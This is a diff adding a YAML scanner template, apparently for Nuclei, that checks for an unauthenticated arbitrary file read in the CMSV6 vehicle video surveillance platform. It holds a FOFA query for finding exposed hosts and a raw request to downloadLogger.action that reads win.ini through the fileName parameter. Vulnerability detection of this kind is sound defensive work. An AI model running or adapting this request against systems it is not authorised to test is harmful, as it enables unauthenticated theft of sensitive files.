@@ -1,0 +1,29 @@
+id: tongtianxingCMSV6-downloadLogger_action-File-reading
+
+info:
+  name: 通天星CMSV6车载视频监控平台 downloadLogger.action 任意文件读取漏洞
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: body="/808gps/"
+    通天星CMSV6车载视频监控平台 downloadLogger.action接口处任意文件读取漏洞，未经身份认证的攻击者可以通过此漏洞获取系统内部敏感文件信息，使系统处于极不安全状态。
+  reference:
+    - https://mp.weixin.qq.com/s/Wu0yXcniK3h3WJOkqeH2RA
+  tags: File reading
+
+
+http:
+  - raw:
+      - |
+        GET /808gps/logger/downloadLogger.action?fileName=C://Windows//win.ini HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '; for 16-bit app support'
+      - type: status
+        status: 
+          - 200
